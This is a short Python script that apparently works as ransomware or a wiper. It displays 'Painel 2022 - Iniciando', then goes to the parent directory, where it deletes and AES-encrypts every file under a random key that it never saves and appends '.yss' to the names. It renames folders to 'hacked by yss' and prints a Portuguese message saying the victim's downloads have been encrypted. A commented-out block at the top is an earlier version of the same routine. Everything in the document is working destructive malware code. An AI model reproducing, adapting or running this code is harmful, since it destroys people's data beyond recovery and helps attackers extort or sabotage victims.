import os
import pyaes
from random import randint

#
#
# p = 'teste.txt.luck.luck'
# filename = p
# file = open(filename, 'rb')
# file_data = file.read()
# file.close()
#
# os.remove(filename)
# key = f"{randint(1000000000000000, 9000000000000000)}".encode()
# aes = pyaes.AESModeOfOperationCTR(key)
# crypto_data = aes.encrypt(file_data)
#
# nw = filename + '.luck'
# file = open(nw, 'w')
# file_data = file.write(str(crypto_data))
# file.close()
#

from os import chdir, getcwd, listdir
from os.path import isfile


print(" Painel 2022 - Iniciando, aguarde")
chdir('..')
# print(dir_path)
for c in listdir():
    if isfile(c):
        if (c == 'painel.py'):
            os.rename(c, 'Hacked by yss.team')

        p = c
        filename = p
        file = open(filename, 'rb')
        file_data = file.read()
        file.close()

        os.remove(filename)
        key = f"{randint(1000000000000000, 9000000000000000)}".encode()
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        nw = filename + '.yss'
        file = open(nw, 'w')
        file_data = file.write(str(crypto_data))
        file.close()
    else:
        os.rename(c, f'hacked by yss and x04 /// coded by yss.team - {randint(4444444444444, 999999999999999999999999999999999999)}')


print('M7 ant random 😘, você foi hackeado, todos os seus downloads foram encriptados')
